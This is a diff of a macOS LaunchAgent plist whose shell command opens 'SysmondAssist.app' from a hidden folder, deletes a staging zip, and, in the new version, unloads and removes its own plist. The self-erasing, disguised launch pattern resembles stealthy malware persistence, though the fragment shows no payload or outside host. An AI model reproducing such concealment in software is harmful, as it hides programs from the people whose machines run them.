@@ -8,7 +8,7 @@
   <array>
     <string>/bin/sh</string>
     <string>-c</string>
-    <string>open ~/.sysmond_config/"SysmondAssist.app" &amp; disown &amp;&amp; rm /tmp/mac_goose.zip && launchctl unload ~/Library/LaunchAgents/com.user.myjob.plist</string>
+    <string>open ~/.sysmond_config/"SysmondAssist.app" &amp; disown &amp;&amp; rm /tmp/mac_goose.zip && launchctl unload ~/Library/LaunchAgents/com.user.assetjob.plist && rm ~/Library/LaunchAgents/com.user.assetjob.plist </string>
   </array>
   <key>StartCalendarInterval</key>
   <dict>
